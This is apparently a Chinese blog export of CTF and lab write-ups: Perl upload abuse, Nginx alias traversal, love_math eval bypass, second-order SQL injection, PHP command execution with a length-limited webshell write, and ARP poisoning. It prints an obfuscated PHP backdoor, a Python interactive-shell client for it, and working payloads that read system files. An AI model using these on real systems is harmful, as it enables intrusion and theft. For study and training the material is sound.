i-got-id-200题目给了三个页面，其中有一个文件上传的页面，随便上传一个文件可以发现会将文件的内容显示出来，猜测这里使用了param()函数 param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的 给了提示Perl File Upload第一次见这个东西，在网上学习了一下 大佬猜测出的后天源码 12345678use strict;use warning;use CGI;my $cgi=CGI-&gt;new;if($cgi-&gt;upload(&#x27;file&#x27;))&#123; my $file=$cgi-&gt;param(&#x27;$file&#x27;); while(&lt;$file&gt;) &#123;print(&quot;$_&quot;);&#125;&#125; 1.抓包修改url和上传内容，修改成如图所示 先读取file.pl文件，盲猜在/var/www/cgi-bin/file.pl，将3部分payload修改 为：/cgi­bin/file.pl?/var/www/cgi-bin/file.pl 利用bash来进行读取当前目录下的文件，将3部分payload修改为：/cgibin/file.pl?/bin/bash%20­c%20ls${IFS}/| 读取当前目录的flag文件内容,将3部分payload修改为：/cgi­bin/file.pl?/flag 参考 Web_php_wrong_nginx_config0x1信息收集进入页面发现要登录，但是没有账号，扫描目录也没发现注册账号的页面，但是发现了robots.txt，其中给了hint.php和hack.php hint.php 1配置文件也许有问题呀：/etc/nginx/sites-enabled/site.conf 还有这几个 抓包发现cookie，将其改为1后发现就可以登录了，这里是使用浏览器的cookie编辑插件 登录后的url 1http://220.249.52.133:35234/admin/admin.php?file=index&amp;ext=php 0x2读取配置文件尝试读取index.php和admin.php源码都失败了，再试试robots.txt中的页面 直接输入路径会跳转到主页不显示内容，可能存在过滤导致文件路径无效 1?file=../../../../etc/nginx/sites-enabled/site.conf&amp;ext= 用双写绕过 1?file=....//....//....//....//etc/nginx/sites-enabled/site.conf&amp;ext= 拿到了配置文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970server &#123; listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ &quot;^(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)&quot;) &#123; set $year $1; set $month $2; set $day $3; &#125; # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) &#123; set $http_x_forwarded_for_filt $1???; &#125; # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / &#123; # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args; server_tokens off; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; location ~ \\.php$ &#123; try_files $uri $uri/ /index.php?q=$uri&amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; &#125; location ~ /\\. &#123; log_not_found off; deny all; &#125; location /web-img &#123; //这里存在问题 alias /images/; autoindex on; &#125; location ~* \\.(ini|docx|pcapng|doc)$ &#123; deny all; &#125; include /var/www/nginx[.]conf; 这个文件内容也看不懂，但是知道这里存在问题 1234location /web-img &#123; alias /images/; autoindex on;&#125; alias,就是给 /web-img，设置了一个别名，当访问/web-img就相当于访问了 /images/ 123location ^~ /t/ &#123; alias /www/root/html/new_t/;&#125; 如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。 autoindex Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件或你要启用目录浏览虚拟主机的配置文件，在server或location 段里添加上autoindex on 这里将其打开就会导致我们可以访问根目录的所有文件夹 url 12http://220.249.52.133:35234/web-img../// web-img../ == /image/../ 相当于回退到了根目录 0x3发现漏洞在/var/www/中发现了一个hack..php.bak，正好是robots.txt中提示的内容 1234567891011121314151617&lt;?php$U=&#x27;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&#x27;;$q=&#x27;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&#x27;;$M=&#x27;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&#x27;;$z=&#x27;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r&#x27;;$k=&#x27;?:;q=0.([\\\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&#x27;;$o=&#x27;|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r&#x27;;$N=&#x27;|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&#x27;;$C=&#x27;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;&#x27;;$j=&#x27;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&#x27;;$R=str_replace(&#x27;rO&#x27;,&#x27;&#x27;,&#x27;rOcreatrOe_rOrOfurOncrOtion&#x27;);$J=&#x27;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$&#x27;;$x=&#x27;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\\\|U|Uw])[|U\\\\w-]+|U(&#x27;;$f=str_replace(&#x27;|U&#x27;,&#x27;&#x27;,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);$g=create_function(&#x27;&#x27;,$f);$g();?&gt; 又是一段奇奇怪怪的代码 但是能看懂最后三行是生成了一个$g函数，而且是由$f生成的，那么久将$f打印出来看看，在线格式化后如下 是一个后门程序，但是如何利用是个问题，实在太菜了，都看不懂写的是什么，只好找到wp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$kh=&quot;42f7&quot;;$kf=&quot;e9ac&quot;;function x($t,$k) &#123; $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for ($i=0;$i&lt;$l;) &#123; for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123; $o.=$t &#123; $i &#125; ^$k &#123; $j &#125; ; &#125; &#125; return $o;&#125;$r=$_SERVER;$rr=@$r[&quot;HTTP_REFERER&quot;];$ra=@$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];if($rr&amp;&amp;$ra) &#123; $u=parse_url($rr); parse_str($u[&quot;query&quot;],$q); $q=array_values($q); preg_match_all(&quot;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/&quot;,$ra,$m); if($q&amp;&amp;$m) &#123; @session_start(); $s=&amp;$_SESSION; $ss=&quot;substr&quot;; $sl=&quot;strtolower&quot;; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=&quot;&quot;; for ($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) &#123; $s[$i]=&quot;&quot;; $p=$ss($p,3); &#125; if(array_key_exists($i,$s)) &#123; $s[$i].=$p; $e=strpos($s[$i],$f); if($e) &#123; $k=$kh.$kf; ob_start(); @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;); @session_destroy(); &#125; &#125; &#125;&#125; 做个分析 先是预定义阶段 , 定义了两个字符串和一个 x() 函数 然后获取攻击者发送的数据 , 这里攻击代码是通过 Referer 字段传输的 注意正则函数 preg_match_all() , 该函数从 Accept-Language 取值 , 然后通过正则匹配后输出到 $m 数组中 然后拼接了前两种可选语言的首字母 , 和预定义的字符串拼接并进行 md5 校验 , 截取等操作 . 然后赋值给 $h 和 $f 两个变量 循环中的 $p .= $q[$m[2][$z]] 会不断从 $q 中提取数据 . 结合之前的代码 , 攻击代码是放在 Referer 中的( 最后会放在 $q 中 ) , 因此这里可以看作是拼接攻击代码 , 组合成 Payload . 然后判断 $h 是否出现在 Payload 的开头 , 若是则设置 $_SESSION[&#39;$i&#39;] = &quot;&quot; , 同时删除 Payload 的 $h 部分 . 接着判断 $_SESSION 中那个是否存在 $i 这个键名 , 若是则将 Payload 赋值给 $_SESSION[$i] , 然后查找 $_SESSION[$i]( 也就是 Payload ) 中 $f 第一次出现的位置 . 最后执行payload exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148from random import randint,choicefrom hashlib import md5import urllibimport stringimport zlibimport base64import requestsimport re# 用于生成完整的 Accept-Languagefrom urllib3.connectionpool import xrangefrom yapf.yapflib.py3compat import raw_inputdef choicePart(seq,amount): length = len(seq) if length == 0 or length &lt; amount: print(&#x27;Error Input&#x27;) return None result = [] # 结果 indexes = [] # 索引 count = 0 while count &lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result# 生成随机填充字符串( 由所有 ASCII 字符组成 , 包括不可读的字符 )def randBytesFlow(amount): result = &#x27;&#x27; for i in xrange(amount): result += chr(randint(0,255)) return result# 生成随机填充字符串( 由所有大小写字母组成 )def randAlpha(amount): result = &#x27;&#x27; for i in xrange(amount): # choice() 方法返回一个列表，元组或字符串的随机项 # string.ascii_letters 会生成所有的字母 result += choice(string.ascii_letters) return result# 模拟 x() 函数 , 循环异或加密def loopXor(text,key): result = &#x27;&#x27; lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt &lt; lenTxt: iKey = 0 while iTxt&lt;lenTxt and iKey&lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result# 开启 Debug 选项def debugPrint(msg): if debugging: print (msg)# 定义基本变量debugging = False # 默认关闭 Debug , 可用 True 开启keyh = &quot;42f7&quot; # $kh , 需要修改keyf = &quot;e9ac&quot; # $kf , 需要修改xorKey = keyh + keyf # $kurl = &#x27;http://111.198.29.45:47960/hack.php&#x27; # 指定 URL , 需要修改defaultLang = &#x27;zh-CN&#x27; #默认Languagelanguages = [&#x27;zh-TW;q=0.%d&#x27;,&#x27;zh-HK;q=0.%d&#x27;,&#x27;en-US;q=0.%d&#x27;,&#x27;en;q=0.%d&#x27;] #Accept-Language 模板proxies = None # &#123;&#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;&#125; # 代理 , 可用于 BurpSuite 等sess = requests.Session() # 创建一个 SESSION 对象# 每次会话会产生一次随机的 Accept-LanguagelangTmp = choicePart(languages,3) # 输出一个列表 , 包含模板中的三种 Accept-languageindexes = sorted(choicePart(range(1,10),3), reverse=True) # 降序排序输出三个权重值 , 例如 [8,6,4]acceptLang = [defaultLang] # 先添加默认Languagefor i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) # 然后循环添加三种 Accept-Language , 并为其添加权重值acceptLangStr = &#x27;,&#x27;.join(acceptLang) # 将多个 Accept-Language 用 &quot; , &quot; 拼接在一起# acceptLangStr 即为要使用的 Accept-LanguagedebugPrint(acceptLangStr)init2Char = acceptLang[0][0] + acceptLang[1][0] # $imd5head = (md5(init2Char + keyh).hexdigest())[0:3] # $hmd5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) # $f + 填充字符串debugPrint(&#x27;$i is %s&#x27; % (init2Char))debugPrint(&#x27;md5 head: %s&#x27; % (md5head,))debugPrint(&#x27;md5 tail: %s&#x27; % (md5tail,))# 交互式 Shellcmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot;while cmd != &#x27;&#x27;: # 在写入 Payload 前填充一些无关数据 query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) # 生成无关数据并填充 debugPrint(&#x27;Before insert payload:&#x27;) debugPrint(query) debugPrint(urllib.urlencode(query)) # 对 Payload 进行加密 payload = zlib.compress(cmd) # gzcompress 操作 payload = loopXor(payload,xorKey) # 循环异或运算 , PHP代码中的 x() 函数 payload = base64.urlsafe_b64encode(payload) # base64_encode 编码 payload = md5head + payload # 在开头补全$h # 对Payload进行修改 cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 # 将 Payload 作为查询字符串编码拼接到 Referer 中 referer = url + &#x27;?&#x27; + urllib.urlencode(query) debugPrint(&#x27;After insert payload, referer is:&#x27;) debugPrint(query) debugPrint(referer) # 发送 HTTP GET 请求 r = sess.get(url,headers=&#123;&#x27;Accept-Language&#x27;:acceptLangStr,&#x27;Referer&#x27;:referer&#125;,proxies=proxies) html = r.text debugPrint(html) # 接收响应数据包 pattern = re.compile(r&#x27;&lt;%s&gt;(.*)&lt;/%s&gt;&#x27; % (xorKey,xorKey)) output = pattern.findall(html) # 如果没有收到响应数据包 if len(output) == 0: print (&#x27;Error, no backdoor response&#x27;) cmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot; continue # 如果收到响应数据包 , 则对其进行处理 output = output[0] debugPrint(output) output = output.decode(&#x27;base64&#x27;) # base64_decode 解码 output = loopXor(output,xorKey) # 循环异或运算 output = zlib.decompress(output) # gzuncompress 运算 print(output) # 输出响应信息 cmd = &quot;system(&#x27;&quot; + raw_input(&#x27;shell &gt; &#x27;) + &quot;&#x27;);&quot; 难度属实有点大了，超出能力范围。 参考 Web_php_wrong_nginx_config WriteUp – H0t-A1r-B4llo0n (guildhab.top) (2条消息) 攻防世界 web高手进阶区 7分题 Web_php_wrong_nginx_config_闵行小鱼塘-CSDN博客 love_math这出题人大意了啊。。。直接可以给显示出来了 还是正常做一做，这题好像有问题，就在buuctf上做了 0x1代码审计12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; get提交参数c，c的长度不能超过80 不能包括blacklist中的字符 不能有不是$whitelist白名单里面的单词出现 并且函数只能以下面的格式出现 abs(1)能过1abs()能过absa()不能过abs(a)不能过abs()a不能过 代码的最后出现了 eval 这是我们想看到的，因为它出现的时候，就可能存在命令执行漏洞 这题实在是无能为力，看了王师傅的wp 详情看这里 0x2构造payload//这题需要使用到php复杂变量，具体可以看这里 当这个题目没有给出那么限制的时候我们想要构造的payload一定是 1?c=system(&quot;cat /flag&quot;) 但是由于限制，必须想办法绕过这些限制，比如多提交一个参数，构造出上面的payload 比如 1?c=($_GET[b])($_GET[a])&amp;b=system&amp;a=cat /flag //这里是b,a多提交的参数，不会被检测 这里的[]可以使用&#123;&#125;代替 下面的具体工作就是如何利用上面提供的函数构造出 _GET，并且能够绕过检测。 首先看一下函数的白名单里给了哪些可以用的函数base_convert()，dechex 还有一些短的函数名pi,cos,sin,tan等，因为限制了长度，所以要尽量使用短的函数名代替a和b 开始的想法就是将利用base_canvert()，转化出一个_GET，但是发现base_convert()不支持_，并且转换出的字符是小写的 所以这里用到了一个中间过渡的函数hex2bin()，与之功能想反的函数是bin2hex() 实现方法如下 下面就是将_GET转换为十六进制数字 12//bin2hex(&quot;_GET&quot;)-&gt;5f474554?c=$pi=base_convert(37907361743,10,36)(5f474554);($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1=system&amp;2=tac /flag 想法是好的，但是这里不能直接提交，因为不符合上面的几种函数使用的格式 所以就要想办法使用一个函数把5f474554提交上去 这里用的是dechex，就是将十进制数转换为十六进制数，再交给hex2bin出来 所以这里有个逆过程就是将5f474554转换为十进制 1intval(&#x27;5f474554&#x27;,16); 所以具体的payload如下 1234567?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;1&#125;(($$pi)&#123;2&#125;)&amp;1=system&amp;2=tac /flag//base_convert(37907361743,10,36)=&gt;hex2bin//dechex(1598506324)=&gt;5f474554//hex2bin(&#x27;5f474554&#x27;)=&gt;_GET//$pi=_GET//($_GET)&#123;1&#125;($_GET&#123;2&#125;) 7分的题目果然不一样，看wp都写了好久 既然没有能力自己做出来，那就好好研究一下别人做题的思路，以便以后遇到类似题目能够有思路。 comment0x1扫描目录拿到题目扫 一下目录，发现是出现.git，那应该就是git源码泄露，可是githacker下载下来的文件好像不全，看了看大佬的wp 暂时没搞懂是怎么下载的，日后再看细看 源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123; header(&quot;Location: ./login.php&quot;); die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;: $category = addslashes($_POST[&#x27;category&#x27;]); $title = addslashes($_POST[&#x27;title&#x27;]); $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into board set category = &#x27;$category&#x27;, title = &#x27;$title&#x27;, content = &#x27;$content&#x27;&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case &#x27;comment&#x27;: $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]); $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0)&#123; $category = mysql_fetch_array($result)[&#x27;category&#x27;]; $content = addslashes($_POST[&#x27;content&#x27;]); $sql = &quot;insert into comment set category = &#x27;$category&#x27;, content = &#x27;$content&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;; $result = mysql_query($sql); &#125; header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123; header(&quot;Location: ./index.php&quot;);&#125;?&gt; 可以看到在write部分提交的都是经过转义后带入查询语句查询的，但是下面的comment中category没有经过任何过滤就带入了sql语句进行查询，这就可能存在二次注入。 0x2二次注入进入题目可以提交评论，但是要登录，给了提示 12username:zhangweipassword:zhangwei*** 使用bp爆破出的密码是zhangwei666 登录后先进入发帖的界面,构造payload 1234$sql &#x3D; &quot;insert into comment set category &#x3D; &#39;$category&#39;, content &#x3D; &#39;$content&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 之前sql注入方法中经常使用的注释方法都是当行注释，但是这个题目的查询使用的是多行，所以这里注释也需要使用多行注释 /**/ 在这里注入的sql语句，在comment页面会被sql重新调出来，从而执行了注入语句，这也是为啥叫做二次注入 于是构造的sql语句如下 1234$sql &#x3D; &quot;insert into comment set category &#x3D; &#39;&#39;,content&#x3D;user(),&#x2F;*&#39;, content &#x3D; &#39;*&#x2F;#&#39;, bo_id &#x3D; &#39;$bo_id&#39;&quot;; 因为中间的 cntent被包围在多行注释中间，所以这里不起作用等价于 123$sql &#x3D; &quot;insert into comment set category &#x3D; &#39;&#39;,content&#x3D;user(), bo_id &#x3D; &#39;$bo_id&#39;&quot;; 当在评论页面评论*/#时，会与之前的/*的进行闭合，就够造出了我们想要的sql语句，user()这个sql函数就会被执行，显示当前的用户 原理知道了，下面就是具体的做这个题目 首先读取 /etc/passwd 看看服务器上有哪些用户，payload为: ‘,content=(select load_file(‘/etc/passwd’)),/* 可以看到是有www用户的，那么久存在.bash_history 记录，继续查看 1title=1&amp;category=&#x27;,content=(select( load_file(&#x27;/home/www/.bash_history&#x27;))),/*&amp;content=11 也就是以下几条指令 1234567cd /tmp/ unzip html.ziprm -f html.zipcp -r html /var/www/cd /var/www/html/rm -f .DS_Storeservice apache2 start 可以看出来 .Ds_Store是存在/tmp/html目录下的，那就看看有什么 直接查看该文件会发现长度不够，而且显示不可见字符 使用hex()就可以解决这个问题 1title=1&amp;category=&#x27;,content=(select hex( load_file(&#x27;/tmp/html/.DS_Store&#x27;))),/*&amp;content=11 在线解码后可以看到以下内容，存在一个 flag_8946e1ff1ee3e40f.php 查看flag，但是要注意的是，这个文件是从 /var/www/html/中复制过来的，所以还是要到那个目录读取 1title=1&amp;category=&#x27;,content=(select hex( load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*&amp;content=11 在线解码即可","tags":[]},{"title":"rce","date":"2020-11-29T08:32:39.000Z","path":"2020/11/29/rce/","text":"看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。 php中存在命令执行的常见函数1.system1234$last_line = system(&#x27;ls&#x27;, $return_var);system() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.$last_line: 只能取得最后一行的内容$return_var: 取得系统状态回传码 2.shell_exec12$output = shell_exec(&#x27;ls&#x27;);$output: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上. 3.exec123exec(&#x27;ls&#x27;, $output, $return_var);$output: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.$return_var: 取得系统状态回传码 3.evaleval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行 例如 12345eval(&quot;phpinfo();&quot;);eval(&quot;system(&#x27;dir&#x27;);&quot;);eval(&quot;echo &#x27;hello!&#x27;;&quot;);//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则 4.create_functionphp官方手册 用法如下 123456$a = &#x27;system&#x27;;$b = &#x27;dir&#x27;;$c = &#x27;assert&#x27;;$d = &#x27;phpinfo()&#x27;;call_user_func($a,$b);call_user_func($c,$d); 5.call_user_func12345678910111213141516$a = create_function(&#x27;$code&#x27;,&#x27;echo $code;&#x27;);$b = &#x27;hello&#x27;;$a($b);$a = &#x27;phpinfo();&#x27;;$b = create_function(&#x27;&#x27;,$a);$b();//和下面两个定义的函数作用相同function a($b)&#123; echo &#x27;$b&#x27;;&#125;function b()&#123; phpinfo();&#125; 限制字符长度的命令执行实验环境为ubuntu nginx+php5.5 实验目的 通过命令执行想服务器写入一句话木马而达到控制服务器的目的 12345678910&lt;?phphighlight_file(__FILE__);if(strlen($_GET[1])&lt;=15)&#123; echo strlen($_GET[1]); echo shell_exec($_GET[1]);&#125;else&#123; exit(&quot;It&#x27;s too long!&quot;);&#125;?&gt; 限制了参数1的字符长度为15 然后将传递的参数放到shell_exec中执行 突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。 所以想要够的payload的为 1?1&#x3D;echo shellcode &gt;1.php 将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求 可以使用echo text &gt;&gt;tmp.txt 将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行 例如下面 字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的 下面就可以做这个题目了 1234567//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件?1=echo \\&lt;\\?php &gt;1?1=echo eval\\( &gt;&gt;1?1=echo \\$_GET &gt;&gt;1?1=echo \\[1\\] &gt;&gt;1?1=echo \\)\\; &gt;&gt;1 ?1=mv 1 1.php 之后访问1.php提交参数，获取想要的内容。","tags":[{"name":"cmd","slug":"cmd","permalink":"https://sunzhengyu99.github.io/tags/cmd/"}]},{"title":"arp attack","date":"2020-11-27T15:51:31.000Z","path":"2020/11/27/attack/","text":"arp攻击ARP（Address Resolution Protocol，地址解析协议是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。 ARP 病毒攻击是局域网最常见的一种攻击方式。由于TCP/IP协议存在的一些漏洞给ARP病毒有进行欺骗攻击的机会，ARP利用TCP/IP协议的漏洞进行欺骗攻击，现已严重影响到人们正常上网和通信安全。当局域网内的计算机遭到ARP的攻击时，它就会持续地向局域网内所有的计算机及网络通信设备发送大量的ARP欺骗数据包，如果不及时处理，便会造成网络通道阻塞、网络设备的承载过重、网络的通讯质量不佳等情况。 攻击原理ARP攻击主要是通过伪造IP地址和MAC地址进行欺骗。使以太网数据包的源地址、目标地址和ARP通信数量剧增导致网络中断或中间人攻击。ARP攻击主要存在于局域网中。若其中一台计算机感染ARP病毒。就会试图通过ARP欺骗截获局域网内其他计算机的信息，造成局域网内的计算机通信故障。 实验机器2003虚拟机，作为ftp服务器 xp虚拟机作为用户访问ftp服务 kali作为攻击方，获取xp登录时的账号密码 xp:10.1.1.3/24 2003:10.1.1.1/24 kali:10.1.1.2/24 实验拓扑图 实验步骤一.检查三台主机的通信情况三台主机通信正常 二.2003开启ftp服务器开启ftp服务，并设置禁止匿名访问 并创建xp访问时需要的使用的账号 123username:aaapassword:123.com 验证是可以正常访问的 三.kali打开攻击软件打开ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;选择第一项 扫描到两台目标主机，开始arp投毒 此时arp攻击已经开始了 